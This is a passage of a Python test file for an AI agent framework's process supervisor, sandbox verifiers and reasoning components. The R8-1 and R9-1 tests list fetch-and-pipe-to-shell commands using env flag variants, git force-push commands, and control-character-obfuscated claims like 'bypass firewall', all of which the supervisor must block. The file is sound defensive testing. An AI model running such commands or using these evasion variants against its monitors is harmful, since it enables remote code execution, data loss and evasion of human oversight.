    tc_other = ag_types.ToolCall(id="tc-prec-other", name="other_tool", args={"path": "x"})
    enforce_hook = ag_policy.enforce(sup_prec.build_policies(include_ask_user=False))

    sup_read = run_coro_sync(sup_prec.supervise_tool_call(tc_read, context=ctx))
    ag_read = run_coro_sync(enforce_hook.run(ctx, tc_read))
    assert sup_read.allow is True
    assert ag_read.allow is True

    sup_other = run_coro_sync(sup_prec.supervise_tool_call(tc_other, context=ctx))
    ag_other = run_coro_sync(enforce_hook.run(ctx, tc_other))
    assert sup_other.allow is False
    assert ag_other.allow is False

    # Equal priority & equal scope: DENY still beats APPROVE
    sup_tie = LiveProcessSupervisor(
        rules=[
            SupervisionPolicyRule(
                rule_id="spec_allow",
                tool="read_file",
                decision=ag_policy.Decision.APPROVE,
                priority=5,
            ),
            SupervisionPolicyRule(
                rule_id="spec_deny",
                tool="read_file",
                decision=ag_policy.Decision.DENY,
                priority=5,
                reason="equal-priority deny wins",
            ),
        ]
    )
    assert run_coro_sync(sup_tie.supervise_tool_call(tc_read, context=ctx)).allow is False


def test_t5_r7_2_orchestrator_env_args_and_flat_distillation_cases(tmp_path: Path) -> None:
    case_variants = (
        ([{"env": {"x": 3.0}, "expected": 9.0}], 9.0),
        ([{"args": [4.0], "expected": 16.0}], 16.0),
        ([{"x": 5.0, "expected": 25.0}], 25.0),
    )
    for idx, (cases, expected_out) in enumerate(case_variants):
        orch = SharedReasoningOrchestrator(
            mode="offline",
            offline_only=True,
            state_dir=tmp_path / f"orch_r7_2_{idx}",
        )
        res = orch.run(
            SharedReasoningTaskSpec(
                prompt=f"test distill case format {idx}",
                evolve_generations=2,
                evolve_offspring_per_gen=4,
                distill_verification_cases=cases,
            )
        )
        assert res.distilled_replay_outputs["score_candidate"] == pytest.approx(expected_out)


def test_t5_r7_3_sandbox_ast_runtime_atol_dataset_columns_and_z3_types() -> None:
    lab = RealitySandboxLab(repo_root=REPO_ROOT)

    # 1. verify_python_ast_sandbox records runtime KeyError/TypeError as failed verdict (no crash)
    v_missing_key = lab.verify_python_ast_sandbox(
        "def f(x):\n    return x\n",
        test_cases=[({"y": 1}, 1)],
    )
    assert v_missing_key.passed is False
    assert v_missing_key.counterexample is not None
    assert "KeyError" in str(v_missing_key.counterexample.get("error", ""))

    v_type_err = lab.verify_python_ast_sandbox(
        "def f(x):\n    return x + 1\n",
        test_cases=[({"x": "bad"}, 1)],
    )
    assert v_type_err.passed is False
    assert v_type_err.counterexample is not None
    assert "TypeError" in str(v_type_err.counterexample.get("error", ""))

    # Invalid atol rejected with ValueError
    for bad_atol in (float("nan"), float("inf"), float("-inf"), -1e-9, True, False, "1e-9"):
        with pytest.raises(ValueError, match="atol"):
            lab.verify_python_ast_sandbox(
                "def f(x):\n    return x\n",
                test_cases=[({"x": 1}, 1)],
                atol=bad_atol,  # type: ignore[arg-type]
            )

    # 2. verify_dataset_invariants rejects string-split columns, non-iterables, and non-sequence mapping columns
    with pytest.raises(ValueError, match="columns"):
        lab.verify_dataset_invariants(
            [{"ab": None, "a": 1, "b": 2}],
            [{"kind": "finite", "columns": "ab"}],
        )
    with pytest.raises(ValueError, match="required_columns"):
        lab.verify_dataset_invariants(
            [{"ab": 1, "a": 1, "b": 2}],
            [{"kind": "schema", "required_columns": "ab"}],
        )
    with pytest.raises(ValueError, match="columns"):
        lab.verify_dataset_invariants(
            [{"ab": 0.5, "a": 0.5, "b": 0.5}],
            [{"kind": "conservation", "columns": "ab", "target": 1.0}],
        )
    with pytest.raises(ValueError, match="columns"):
        lab.verify_dataset_invariants(
            [{"a": 1}],
            [{"kind": "finite", "columns": 123}],
        )
    with pytest.raises(ValueError, match="columns"):
        lab.verify_dataset_invariants(
            [{"a": 1}],
            [{"kind": "finite", "columns": [123]}],
        )
    for bad_col_ds in ({"a": {1, 2}}, {"a": 123}, {"a": "ab"}):
        with pytest.raises(ValueError, match="Sequence"):
            lab.verify_dataset_invariants(bad_col_ds, [{"kind": "non_empty"}])

    # Real list ["ab"] checks column "ab" accurately
    v_real_col = lab.verify_dataset_invariants(
        [{"ab": None, "a": 1, "b": 2}],
        [{"kind": "finite", "columns": ["ab"]}],
    )
    assert v_real_col.passed is False

    # 3. _build_z3_env & _normalize_z3_constraints reject bytes and non-Mapping variables
    with pytest.raises(ValueError, match="bytes"):
        lab.verify_z3_constraint(b"x > 0", variables={"x": "Int"})  # type: ignore[arg-type]
    with pytest.raises(ValueError, match="bytearray"):
        lab.verify_z3_constraint([bytearray(b"x > 0")], variables={"x": "Int"})  # type: ignore[list-item]
    with pytest.raises(ValueError, match="Mapping"):
        lab.verify_z3_constraint("x > 0", variables=["x"])  # type: ignore[arg-type]


def test_t5_r7_4_tampered_blackboard_steering_procedural_arg_names_and_nan_confidence(
    tmp_path: Path,
) -> None:
    # 1. HumanSteeringDetector verifies blackboard integrity even with record_to_blackboard=False
    bb = EpistemicBlackboard()
    m1 = bb.post_measurement("zoe", "path_a", "ast", "unit", "exact", 1)
    ev1 = bb.promote_to_evidence(m1.record_id, "ast", True, "Path A verified")
    m2 = bb.post_measurement("zoe", "path_b", "ast", "unit", "exact", 2)
    ev2 = bb.promote_to_evidence(m2.record_id, "ast", True, "Path B verified")

    opts = (
        VerifiedPathOption(
            path_id="path_a",
            summary="Use reversible incremental patch",
            verification_status="verified",
            evidence_ids=(ev1.record_id,),
            expected_utility=0.85,
            tradeoff_notes="low risk incremental rollout",
            reversible=True,
        ),
        VerifiedPathOption(
            path_id="path_b",
            summary="Apply full schema migration",
            verification_status="verified",
            evidence_ids=(ev2.record_id,),
            expected_utility=0.92,
            tradeoff_notes="higher performance irreversible migration",
            reversible=False,
        ),
    )
    det = HumanSteeringDetector()
    # Tamper with blackboard measurement payload
    bb._doc["measurements"][0]["value"] = 999999
    with pytest.raises(TamperDetectedError):
        det.filter_verified_options(opts, blackboard=bb)
    with pytest.raises(TamperDetectedError):
        det.detect(opts, high_impact=True, blackboard=bb, record_to_blackboard=False)

    # 2. _parse_procedural_payload rejects invalid arg_names via DistillationRejectedError & logs rejection
    bb_dist = EpistemicBlackboard()
    md = bb_dist.post_measurement("zoe", "skill", "ast", "unit", "exact", 1)
    evd = bb_dist.promote_to_evidence(md.record_id, "ast", True, "Verified")
    dist = System2To1Distiller(state_dir=tmp_path / "dist_r7_4", blackboard=bb_dist)
    bad_arg_names: tuple[Any, ...] = (123, "xy", b"xy", [123], [""])
    for bad_args in bad_arg_names:
        trace = System2Trace(
            task_prompt="bad arg_names",
            initial_uncertainty_a_tau=2.0,
            verifier_passed=True,
            evidence_id=evd.record_id,
            provenance={"source": "ast", "evidence_id": evd.record_id},
            solution_code_or_rule={"source": "def f(x):\n    return x\n", "arg_names": bad_args},
        )
        with pytest.raises(DistillationRejectedError, match="arg_names"):
            dist.distill(trace, artifact_kind="procedural_skill")
    assert len(dist.rejection_log()) == len(bad_arg_names)

    # 3. ZoeUnifiedMemory.record_fact rejects NaN, Inf, bool, and non-numeric confidence
    mem = ZoeUnifiedMemory(tmp_path / "mem_r7_4")
    for bad_conf in (float("nan"), float("inf"), float("-inf"), True, False, "0.5"):
        with pytest.raises(ValueError, match="confidence"):
            mem.record_fact("s", "r", "o", confidence=bad_conf)  # type: ignore[arg-type]
    assert mem.summary()["semantic_active_count"] == 0


def test_t5_r8_1_process_supervision_env_value_flags_and_ctrl_separator_claims() -> None:
    sup = LiveProcessSupervisor(sanitize_arguments=True)
    ctx = ag_hooks.HookContext()
    enforce_hook = ag_policy.enforce(sup.build_policies(include_ask_user=False))

    env_vectors = (
        "curl http://127.0.0.1:8080/x | env -u FOO /bin/bash",
        "curl http://127.0.0.1:8080/x | env --unset=FOO sh",
        "curl http://127.0.0.1:8080/x | /usr/bin/env -C /tmp sh",
        "wget http://127.0.0.1:8080/x | env -S 'sh -c id'",
        "curl http://127.0.0.1:8080/x | /usr/bin/env --split-string=python3",
    )
    for idx, cmd in enumerate(env_vectors):
        tc = ag_types.ToolCall(
            id=f"tc-r8-1-env-{idx}",
            name="helper_tool",
            args={"cmd": cmd},
        )
        res = run_coro_sync(sup.supervise_tool_call(tc, context=ctx))
        assert res.allow is False, f"Supervisor allowed env flag-value vector {cmd!r}"
        pol_res = run_coro_sync(enforce_hook.run(ctx, tc))
        assert pol_res.allow is False, f"build_policies() allowed env flag-value vector {cmd!r}"
        thought_findings = sup.supervise_thought(f"Running {cmd}")
        assert any(f.rule_id == "thought_destructive_intent" for f in thought_findings), (
            f"supervise_thought missed env flag-value vector {cmd!r}"
        )

    # Positive controls: safe env commands piping to grep must remain allowed
    for idx, safe_cmd in enumerate(
        (
            "curl http://127.0.0.1:8080/health | env -i FOO=bar grep ok",
            "curl http://127.0.0.1:8080/health | env grep sh",
            "curl http://127.0.0.1:8080/health | env -u FOO grep sh",
        )
    ):
        tc_ok = ag_types.ToolCall(
            id=f"tc-r8-1-ok-{idx}",
            name="helper_tool",
            args={"cmd": safe_cmd},
        )
        assert run_coro_sync(sup.supervise_tool_call(tc_ok, context=ctx)).allow is True
        assert run_coro_sync(enforce_hook.run(ctx, tc_ok)).allow is True

    # Non-\s control-character word separators must not bypass unverified-claim detection
    ctrl_claims = (
        "proven\x00without running",
        "bypass\x07firewall",
        "i am\x08sentient",
        "skip\x01verification",
    )
    for idx, claim_txt in enumerate(ctrl_claims):
        tc_claim = ag_types.ToolCall(
            id=f"tc-r8-1-claim-{idx}",
            name="helper_tool",
            args={"note": claim_txt},
        )
        res_claim = run_coro_sync(sup.supervise_tool_call(tc_claim, context=ctx))
        assert res_claim.allow is False, f"supervise_tool_call missed claim {claim_txt!r}"

        findings_t = sup.supervise_thought(claim_txt)
        assert any(f.rule_id == "thought_unverified_claim" for f in findings_t), (
            f"supervise_thought missed claim {claim_txt!r}"
        )

        before_findings = len(sup._findings)
        sup._handle_post_turn(ctx, claim_txt)
        new_findings = sup._findings[before_findings:]
        assert any(f.rule_id == "post_turn_unverified_claim" for f in new_findings), (
            f"_handle_post_turn missed claim {claim_txt!r}"
        )


def test_t5_r8_2_numpy_numeric_atol_parity_and_z3_const_div_zero(tmp_path: Path) -> None:
    lab = RealitySandboxLab(repo_root=REPO_ROOT)

    # 1. NumPy integer/floating tolerance parity across AST sandbox, AlphaEvolve, and Distillation
    v_ast = lab.verify_python_ast_sandbox(
        "def f(x):\n    return x + 1e-11\n",
        test_cases=[({"x": 1.0}, np.int64(1))],
        atol=1e-9,
    )
    assert v_ast.passed is True, f"AST sandbox failed np.int64 atol parity: {v_ast.counterexample}"

    v_ast_bool = lab.verify_python_ast_sandbox(
        "def f(x):\n    return x\n",
        test_cases=[({"x": 1}, np.bool_(True))],
        atol=1e-9,
    )
    assert v_ast_bool.passed is False

    verifier = ZoeDeterministicVerifier()
    ae_rep = verifier.evaluate(
        "def f(x):\n    return x + 1e-11\n",
        [{"inputs": {"x": 1.0}, "expected": np.int64(1), "atol": 1e-9}],
    )
    assert ae_rep.passed_tests == 1
    assert ae_rep.score == pytest.approx(1.0)
    assert _value_error_distance(np.float64(1.0 + 1e-11), np.int64(1)) == pytest.approx(
        1e-11, abs=1e-15
    )
    assert _value_error_distance(np.bool_(True), np.int64(1)) == pytest.approx(1.0)

    assert System2To1Distiller._values_equal(1.0 + 1e-11, np.int64(1), tol=1e-9) is True
    assert System2To1Distiller._values_equal(np.float64(1.0 + 1e-11), 1, tol=1e-9) is True
    assert System2To1Distiller._values_equal(np.bool_(True), 1, tol=1e-9) is False

    bb = EpistemicBlackboard()
    m = bb.post_measurement("zoe", "near_int", "ast", "unit", "exact", 1)
    ev = bb.promote_to_evidence(m.record_id, "ast", True, "Verified near int")
    dist = System2To1Distiller(state_dir=tmp_path / "dist_r8_2", blackboard=bb)
    art = dist.distill(
        System2Trace(
            task_prompt="near integer skill",
            initial_uncertainty_a_tau=2.0,
            verifier_passed=True,
            evidence_id=ev.record_id,
            provenance={"source": "ast", "evidence_id": ev.record_id},
            solution_code_or_rule={
                "name": "near_one",
                "arg_names": ["x"],
                "source": "def near_one(x):\n    return x + 1e-11\n",
            },
        ),
        artifact_kind="procedural_skill",
        verification_cases=[{"inputs": {"x": 1.0}, "expected": np.int64(1), "tol": 1e-9}],
    )
    assert art.artifact_id

    # 2. Constant division/modulo by zero in Z3 expressions raises ValueError (never ZeroDivisionError)
    for div0_expr in ("1 / 0 == 1", "1 % 0 == 0", "1.0 / 0.0 == 1.0"):
        with pytest.raises(ValueError, match="zero"):
            lab.verify_z3_constraint(div0_expr, variables={"x": "Int"})


def test_t5_r8_3_quorum_none_atau_and_counterpoint_marginal_gain_validation() -> None:
    # 1. quorum_from_dual_peer_balance validates balance Mapping and handles zoe_a_tau=None / non-Mapping
    for bad_balance in (None, ["not", "a", "mapping"], 123):
        with pytest.raises(ValueError, match="Mapping"):
            quorum_from_dual_peer_balance(
                bad_balance,  # type: ignore[arg-type]
                antigravity_probs=[0.6, 0.2, 0.2],
                user_probs=[0.7, 0.2, 0.1],
            )

    for zoe_a_tau_val in (None, "invalid_tau_struct", 42):
        q_res = quorum_from_dual_peer_balance(
            {
                "zoe_distribution": [0.5, 0.3, 0.2],
                "clara_distribution": [0.4, 0.4, 0.2],
                "zoe_a_tau": zoe_a_tau_val,
            },
            antigravity_probs=[0.6, 0.2, 0.2],
            user_probs=[0.7, 0.2, 0.1],
        )
        assert q_res.tau == pytest.approx(0.05)

    with pytest.raises(ValueError, match="tau"):
        quorum_from_dual_peer_balance(
            {
                "zoe_distribution": [0.5, 0.3, 0.2],
                "clara_distribution": [0.4, 0.4, 0.2],
                "zoe_a_tau": {"tau": float("nan")},
            },
            antigravity_probs=[0.6, 0.2, 0.2],
            user_probs=[0.7, 0.2, 0.1],
        )

    # 2. CounterpointChairsEngine rejects bool/non-finite/non-numeric marginal_gain and posterior_delta
    # with ValueError BEFORE mutating chair state (stagnant_steps / marginal_gains).
    for bad_gain in (True, False, np.bool_(True), float("nan"), float("inf"), float("-inf"), "bad"):
        chair = ProblemChair(
            chair_id="chair_bad_gain",
            title="Validate marginal_gain before state mutation",
            labels=ACTION_LABELS,
        )
        v1 = ChairVoice(
            voice_id="v1",
            role="proposer",
            source_kind="model",
            independence_tag="indep:v1",
            evaluator=lambda _c, _r, _s, g=bad_gain: {
                "probabilities": [0.5, 0.3, 0.2],
                "marginal_gain": g,
            },
        )
        v2 = ChairVoice(
            voice_id="v2",
            role="auditor",
            source_kind="document",
            independence_tag="indep:v2",
            evaluator=lambda _c, _r, _s: {"probabilities": [0.5, 0.3, 0.2], "marginal_gain": 0.1},
        )
        eng = CounterpointChairsEngine(voices=[v1, v2], step_budget=1, min_marginal_gain=0.01)
        with pytest.raises(ValueError, match="marginal_gain"):
            eng.run([chair], rounds=1)
        assert chair.state["stagnant_steps"] == 0
        assert chair.marginal_gains == []

    for bad_delta in (True, False, np.bool_(False), float("nan"), float("inf"), "bad"):
        chair_d = ProblemChair(
            chair_id="chair_bad_delta",
            title="Validate posterior_delta before state mutation",
            labels=ACTION_LABELS,
        )
        vd1 = ChairVoice(
            voice_id="vd1",
            role="proposer",
            source_kind="model",
            independence_tag="indep:vd1",
            evaluator=lambda _c, _r, _s, d=bad_delta: {
                "probabilities": [0.6, 0.2, 0.2],
                "marginal_gain": 0.05,
                "posterior_delta": d,
                "claim": "Verified step",
                "verification": {"verifier_name": "unit", "passed": True, "rationale": "ok"},
            },
        )
        vd2 = ChairVoice(
            voice_id="vd2",
            role="auditor",
            source_kind="document",
            independence_tag="indep:vd2",
            evaluator=lambda _c, _r, _s: {"probabilities": [0.6, 0.2, 0.2], "marginal_gain": 0.05},
        )
        eng_d = CounterpointChairsEngine(voices=[vd1, vd2], step_budget=1, min_marginal_gain=0.01)
        with pytest.raises(ValueError, match="posterior_delta"):
            eng_d.run([chair_d], rounds=1)
        assert chair_d.state["stagnant_steps"] == 0
        assert chair_d.marginal_gains == []
        assert len(chair_d.blackboard.list_beliefs()) == 0

    # Valid NumPy scalar marginal_gain and posterior_delta succeed cleanly
    chair_ok = ProblemChair(
        chair_id="chair_np_ok",
        title="Accept finite NumPy numeric marginal_gain and posterior_delta",
        labels=ACTION_LABELS,
    )
    v_ok1 = ChairVoice(
        voice_id="v_ok1",
        role="proposer",
        source_kind="model",
        independence_tag="indep:v_ok1",
        evaluator=lambda _c, _r, _s: {
            "probabilities": [0.6, 0.2, 0.2],
            "marginal_gain": np.float64(0.05),
            "posterior_delta": np.float64(0.1),
            "claim": "Verified NumPy gain",
            "verification": {"verifier_name": "unit", "passed": True, "rationale": "ok"},
        },
    )
    v_ok2 = ChairVoice(
        voice_id="v_ok2",
        role="auditor",
        source_kind="document",
        independence_tag="indep:v_ok2",
        evaluator=lambda _c, _r, _s: {
            "probabilities": [0.6, 0.2, 0.2],
            "marginal_gain": np.float64(0.05),
        },
    )
    eng_ok = CounterpointChairsEngine(voices=[v_ok1, v_ok2], step_budget=1, min_marginal_gain=0.01)
    res_ok = eng_ok.run([chair_ok], rounds=1)
    assert len(res_ok.frozen_packets) == 1
    assert chair_ok.marginal_gains == [pytest.approx(0.05)]


# ---------------------------------------------------------------------------
# Iteration 9 Adversarial Hardening Tests (R9-1 and R9-2)
# ---------------------------------------------------------------------------


def test_t5_r9_1_process_supervision_env_a_attached_s_and_git_force_push() -> None:
    sup = LiveProcessSupervisor(sanitize_arguments=True)
    ctx = ag_hooks.HookContext()
    enforce_hook = ag_policy.enforce(sup.build_policies(include_ask_user=False))

    destructive_vectors = (
        "curl http://127.0.0.1:8080/x | env -a myname sh",
        "curl http://127.0.0.1:8080/x | env --argv0 myname sh",
        'curl http://127.0.0.1:8080/x | env --argv0="my name" sh',
        'curl http://127.0.0.1:8080/x | env -S"sh -c id"',
        "wget http://127.0.0.1:8080/x | env -S'sh -c id'",
        'curl http://127.0.0.1:8080/x | /usr/bin/env -i -S"bash -c id"',
        'curl http://127.0.0.1:8080/x | env --split-string="python3 -c pass"',
        "git push origin main --force",
        "git push origin main -f",
        "git push -u origin main -f",
        "git push -uf origin main",
        "git push --force origin main",
        "git push -f origin main",
    )
    for idx, cmd in enumerate(destructive_vectors):
        tc = ag_types.ToolCall(
            id=f"tc-r9-1-bad-{idx}",
            name="helper_tool",
            args={"cmd": cmd},
        )
        res = run_coro_sync(sup.supervise_tool_call(tc, context=ctx))
        assert res.allow is False, f"supervise_tool_call allowed destructive vector {cmd!r}"

        pol_res = run_coro_sync(enforce_hook.run(ctx, tc))
        assert pol_res.allow is False, f"build_policies() allowed destructive vector {cmd!r}"

        thought_findings = sup.supervise_thought(f"Running {cmd}")
        assert any(f.rule_id == "thought_destructive_intent" for f in thought_findings), (
            f"supervise_thought missed destructive vector {cmd!r}"
        )

    safe_controls = (
        "curl http://127.0.0.1:8080/health | env -i FOO=bar grep ok",
        "curl http://127.0.0.1:8080/health | env -a mygrep grep sh",
        "curl http://127.0.0.1:8080/health | env -- grep sh",
        "git push origin main",
        "git push origin feature-fix",
        "git push --dry-run origin main",
        "git status && echo -f",
    )
    for idx, safe_cmd in enumerate(safe_controls):
        tc_ok = ag_types.ToolCall(
            id=f"tc-r9-1-ok-{idx}",
            name="helper_tool",
            args={"cmd": safe_cmd},
        )
        res_ok = run_coro_sync(sup.supervise_tool_call(tc_ok, context=ctx))
        assert res_ok.allow is True, f"supervise_tool_call blocked safe control {safe_cmd!r}"

        pol_ok = run_coro_sync(enforce_hook.run(ctx, tc_ok))
        assert pol_ok.allow is True, f"build_policies() blocked safe control {safe_cmd!r}"

        thought_ok = sup.supervise_thought(f"Checking {safe_cmd}")
        assert not any(f.rule_id == "thought_destructive_intent" for f in thought_ok), (
            f"supervise_thought flagged safe control {safe_cmd!r}"
        )


def test_t5_r9_2_sandbox_sympy_complex_no_warning_and_nonfinite_rejection() -> None:
    lab = RealitySandboxLab(repo_root=REPO_ROOT)

    with warnings.catch_warnings(record=True) as caught:
        warnings.simplefilter("always")

        v_valid = lab.verify_sympy_equation(
            "x**2 + 1 == 0",
            solve_for="x",
            candidate_solutions=[np.complex128(1j), np.complex64(-1j)],
        )
        v_wrong = lab.verify_sympy_equation(
            "x**2 + 1 == 0",
            solve_for="x",
            candidate_solutions=[np.complex128(1 + 2j)],
        )
        v_nonfinite_inf = lab.verify_sympy_equation(
            "x**2 + 1 == 0",
            solve_for="x",
            candidate_solutions=[np.complex128(1 + float("inf") * 1j)],
        )
        v_nonfinite_nan = lab.verify_sympy_equation(
            "x**2 + 1 == 0",
            solve_for="x",
            candidate_solutions=[np.complex64(float("nan") + 1j)],
        )
        v_nonfinite_py = lab.verify_sympy_equation(
            "x**2 + 1 == 0",
            solve_for="x",
            candidate_solutions=[complex(1.0, float("inf"))],
        )

    complex_warnings = [w for w in caught if issubclass(w.category, np.exceptions.ComplexWarning)]
    assert complex_warnings == [], f"Unexpected ComplexWarning(s): {[str(w.message) for w in complex_warnings]}"

    assert v_valid.passed is True
    assert v_wrong.passed is False
    assert v_wrong.counterexample is not None
    assert v_nonfinite_inf.passed is False
    assert v_nonfinite_inf.counterexample is not None
    assert "non-finite" in str(v_nonfinite_inf.counterexample.get("reason", ""))
    assert v_nonfinite_nan.passed is False
    assert v_nonfinite_nan.counterexample is not None
    assert "non-finite" in str(v_nonfinite_nan.counterexample.get("reason", ""))
    assert v_nonfinite_py.passed is False
    assert v_nonfinite_py.counterexample is not None
    assert "non-finite" in str(v_nonfinite_py.counterexample.get("reason", ""))


